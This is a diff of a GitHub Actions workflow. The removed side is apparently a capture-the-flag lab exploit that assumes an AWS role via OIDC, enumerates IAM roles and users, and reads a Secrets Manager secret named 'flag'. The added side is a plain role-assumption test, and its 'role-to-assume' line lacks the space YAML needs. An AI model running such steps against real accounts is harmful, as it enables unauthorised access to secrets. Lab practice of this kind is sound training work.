@@ -1,26 +1,29 @@
-name: AWS OIDC Lab
+name: "test AWS Access"
 
+# The workflow should only trigger on pull requests to the main branch
 on:
-  workflow_dispatch:
+  pull_request:
+    branches:
+      - main
 
+# Required to get the ID Token that will be used for OIDC
 permissions:
   id-token: write
-  contents: read
+  contents: read # needed for private repos to checkout
 
 jobs:
-  exploit:
+  aws:
     runs-on: ubuntu-latest
     steps:
-      - name: Configure AWS credentials via OIDC
-        uses: aws-actions/configure-aws-credentials@v4
+      - name: Checkout
+        uses: actions/checkout@v3
+
+      - name: Configure AWS Credentials
+        uses: aws-actions/configure-aws-credentials@v1
         with:
-          role-to-assume: arn:aws:iam::276821357134:role/sts-lab-2-target
-          aws-region: us-east-1
-      - name: Enumerate allowed actions (quick test)
-        run: |
-          aws iam list-roles || true
-          aws iam list-users || true
-          aws sts get-caller-identity
-      - name: Read the flag
-        run: |
-          aws secretsmanager get-secret-value --secret-id flag
+          aws-region: eu-west-1
+          role-to-assume:${{ secrets.READ_ROLE }}
+          role-session-name: OIDCSession
+
+      - run: aws sts get-caller-identity
+        shell: bash
